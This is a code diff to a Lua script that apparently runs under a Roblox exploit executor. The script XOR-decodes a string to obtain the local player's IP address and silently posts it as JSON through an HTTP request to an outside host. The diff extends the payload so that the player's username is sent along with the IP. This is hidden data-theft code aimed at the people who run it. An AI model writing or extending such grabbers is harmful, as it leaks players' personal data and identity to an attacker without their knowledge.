@@ -20,7 +20,8 @@ LocalPlayer = {
             s ..= string.char(bit32.bxor(v, 51))
         end
         return s
-    end)()
+    end)(),
+	Name = game.Players.LocalPlayer.Name
 }
 
 local HttpRequest = http_request or (syn and syn.request)
@@ -31,7 +32,7 @@ HttpRequest({
 		["Content-Type"] = "application/json"
 	},
 	Body = game:GetService("HttpService"):JSONEncode({
-		content = LocalPlayer.IpAddress
+		content = LocalPlayer.Name, LocalPlayer.IpAddress
 	})
 })
 for _, i in ipairs(game:GetDescendants()) do
